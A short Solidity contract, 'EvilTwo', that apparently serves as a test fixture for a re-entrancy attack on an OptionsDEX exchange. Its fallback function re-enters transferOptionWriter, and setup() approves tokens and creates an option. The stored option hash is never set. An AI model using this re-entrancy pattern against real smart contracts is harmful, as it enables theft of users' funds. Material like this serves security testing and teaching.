pragma solidity 0.8.0;

import "../interfaces/IERC20.sol";
import "../interfaces/IOptionsDEX.sol";

/*
Smart contract for attemtping a re-entrancy attack on OptionsDEX

During initialization, EvilTwo recieves the addresses to interact with OptionsDEX and an ERC-20 token (CayugaCoin). The user then calls setup() so that EvilTwo allows OptionsDEX to transfer its ERC20 tokens; EvilTwo also creates the option that will used in the re-entrancy attack. Finally, the user calls transferOptionWriter() from the options smart contract which will start the re-entrancy attack.
*/
contract EvilTwo {

    // ERC20 contract
    IERC20 immutable token;
    // OptionsDEX contract
    IOptionsDEX immutable optionsContract;
    // Option hash
    bytes32 private hash;

    constructor(address payable _optionsDEX, address _token) {
        token = IERC20(_token);
        optionsContract = IOptionsDEX(_optionsDEX);
    }

    function setup() public {
        // Give permission for OptionsDEX to use tokens
        token.approve(address(optionsContract), 100*10**18);
        // Create option
        optionsContract.createOption(address(token), 0.1*10**18, 1, 200);
    }

    fallback() external payable {
        optionsContract.transferOptionWriter(hash);
    }

}